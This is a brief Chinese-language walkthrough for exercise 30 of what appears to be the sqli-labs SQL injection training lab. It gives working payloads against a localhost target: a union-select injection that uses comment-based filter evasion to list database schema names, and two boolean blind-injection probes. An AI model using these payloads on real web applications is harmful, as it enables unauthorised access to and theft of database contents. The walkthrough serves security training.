# Lesson-30
```
Bool盲注-,-明注
```

和上道题思路一样
可以通过盲注也可以明注

明注验证Payload : 
```
http://127.0.0.1/Less-30/?id=0%22union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata--+
```

盲注验证Payload : 
```
http://127.0.0.1/Less-30/?id=0%22||0--+
http://127.0.0.1/Less-30/?id=0%22||1--+
```
